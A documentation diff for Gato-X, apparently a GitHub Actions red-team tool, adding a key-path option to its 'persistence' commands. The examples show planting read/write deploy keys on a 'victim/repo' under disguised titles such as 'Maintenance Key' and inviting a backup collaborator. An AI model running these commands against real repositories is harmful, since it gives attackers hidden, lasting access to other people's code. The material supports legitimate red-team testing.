@@ -40,6 +40,7 @@ gato-x p [options]
 |--------|-------------|
 | `--deploy-key` | Create a read/write deploy key for the repository (requires admin privileges) |
 | `--key-title`, `-k` | Title for the deploy key (default: "Gato-X Deploy Key") |
+| `--key-path`, `-p` | Path to save the private key file (required when using --deploy-key) |
 
 #### Malicious Workflow Creation (Write Required)
 
@@ -77,16 +78,16 @@ This technique generates and installs read/write SSH deploy keys with automatic 
 
 ```bash
 # Create deploy key with default title
-gato-x persistence --target org/repo --deploy-key
+gato-x persistence --target org/repo --deploy-key --key-path ./private_key.pem
 
 # Create deploy key with custom title
-gato-x persistence --target org/repo --deploy-key --key-title "Backup Key"
+gato-x persistence --target org/repo --deploy-key --key-title "Backup Key" --key-path ./backup_key.pem
 ```
 
 **How it works**:
 - Generates a 2048-bit RSA key pair automatically
 - Installs the public key as a read/write deploy key in the repository
-- Outputs the private key for the attacker to save securely
+- Saves the private key to the specified file path
 - Deploy key provides Git access independent of the original PAT
 
 ### 3. Malicious Pull Request Target Workflow
@@ -117,7 +118,7 @@ gato-x persistence --target org/repo --pwn-request --branch-name feature/test
 
 ```bash
 # Step 1: Create deploy key for Git access
-gato-x persistence --target victim/repo --deploy-key --key-title "Maintenance Key"
+gato-x persistence --target victim/repo --deploy-key --key-title "Maintenance Key" --key-path ./maint_key.pem
 
 # Step 2: Invite backup collaborator
 gato-x persistence --target victim/repo --collaborator backup-user
